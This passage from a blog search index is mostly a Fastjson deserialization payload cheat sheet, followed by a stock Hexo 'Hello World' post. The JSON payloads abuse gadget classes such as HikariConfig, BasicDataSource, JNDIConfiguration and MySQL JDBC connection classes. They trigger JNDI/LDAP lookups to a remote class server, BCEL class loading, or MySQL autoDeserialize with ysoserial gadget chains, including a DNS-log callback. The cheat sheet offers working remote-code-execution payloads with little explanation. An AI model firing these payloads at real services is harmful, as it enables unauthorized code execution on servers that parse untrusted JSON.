class="hljs-punctuation">:</span> <span class="hljs-number">22</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>&#x27;bufLen&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">1048576</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>&#x27;protocolVersion&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>BasicDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A...o$V$A$A&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>HikariConfig</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>SessionBeanProvider</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;jndiName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;Object&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;su18&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>JMSContentInterceptor</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.util.Hashtable&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;java.naming.factory.initial&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;topic-factory&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;namespace&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>ContextClassLoaderSwitcher</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.jboss.util.loading.ContextClassLoaderSwitcher&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;contextClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$...$A$A&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>OracleManagedConnectionFactory</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;xaDataSourceName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>JNDIConfiguration</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>JDBC4Connection</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;hostToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;172.20.64.40&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;portToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;databaseToConnectTo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.util.Properties&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;PORT&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3306&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;statementInterceptors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;PORT.1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3306&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;HOST.1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;172.20.64.40&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;NUM_HOSTS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;HOST&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;172.20.64.40&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;DBNAME&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>LoadBalancedMySQLConnection</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;connectionString&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>UnpooledDataSource</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;driver&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$...&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>LoadBalancedMySQLConnection2</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;connectionString&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;useSSL=false&amp;user=yso_CommonsCollections5_calc&quot;</span> <span class="hljs-punctuation">&#125;</span> <span class="hljs-punctuation">&#125;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>ReplicationMySQLConnection</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="hljs-punctuation">,</span><br>       <span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>              <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="hljs-punctuation">,</span><br>              <span class="hljs-attr">&quot;connectionUrl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                     <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="hljs-punctuation">,</span><br>                     <span class="hljs-attr">&quot;masters&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><br>                     <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                     <span class="hljs-attr">&quot;slaves&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                     <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;3306&quot;</span><span class="hljs-punctuation">,</span>          <br>                            <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;yso_CommonsCollections4_calc&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;dbname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;queryInterceptors&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;true&quot;</span><br>                     <span class="hljs-punctuation">&#125;</span><br>              <span class="hljs-punctuation">&#125;</span><br>       <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="fastjson备忘录"><a href="#fastjson备忘录" class="headerlink" title="fastjson备忘录"></a>fastjson备忘录</h2><p><a href="https://github.com/safe6Sec/Fastjson/blob/master/README.md">Fastjson&#x2F;README.md at master · safe6Sec&#x2F;Fastjson (github.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/08/25/hello-world/"/>
    <url>/2024/08/25/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
